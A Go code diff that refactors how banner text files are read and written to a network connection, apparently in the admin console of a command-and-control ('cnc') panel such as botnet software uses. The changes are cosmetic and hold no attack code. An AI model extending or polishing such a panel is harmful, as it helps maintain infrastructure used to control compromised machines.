@@ -1,8 +1,8 @@
 package main
 
 import (
-	"io/ioutil"
 	"net"
+	"os"
 	"strings"
 	"unicode/utf8"
 
@@ -182,21 +182,44 @@ func writeCenteredBanner(conn net.Conn, banner string, terminalWidth int) {
 	}
 }
 
-func writePinkCyanAdminHeader(conn net.Conn, user *User) {
-	terminalWidth := currentTerminalWidth(conn)
-	bannerPaths := []string{
-		"banners/home.tfx",
-		"cnc/banners/home.tfx",
-	}
-
+func writeThemeBannerFromPaths(conn net.Conn, terminalWidth int, bannerPaths []string) bool {
 	for _, path := range bannerPaths {
-		banner, err := ioutil.ReadFile(path)
+		banner, err := os.ReadFile(path)
 		if err != nil || len(banner) == 0 {
 			continue
 		}
 
 		writeCenteredBanner(conn, string(banner), terminalWidth)
 		conn.Write([]byte("\r\n"))
+		return true
+	}
+
+	return false
+}
+
+func writeThemeBannerRawFromPaths(conn net.Conn, bannerPaths []string) bool {
+	for _, path := range bannerPaths {
+		banner, err := os.ReadFile(path)
+		if err != nil || len(banner) == 0 {
+			continue
+		}
+
+		normalized := strings.ReplaceAll(string(banner), "\r\n", "\n")
+		normalized = strings.ReplaceAll(normalized, "\r", "\n")
+		lines := strings.Split(normalized, "\n")
+		for _, line := range lines {
+			conn.Write([]byte(line + ansiReset + "\r\n"))
+		}
+		conn.Write([]byte("\r\n"))
+		return true
+	}
+
+	return false
+}
+
+func writePinkCyanAdminHeader(conn net.Conn, user *User) {
+	terminalWidth := currentTerminalWidth(conn)
+	if writeThemeBannerFromPaths(conn, terminalWidth, pinkCyanThemeBannerPaths) {
 		return
 	}
 
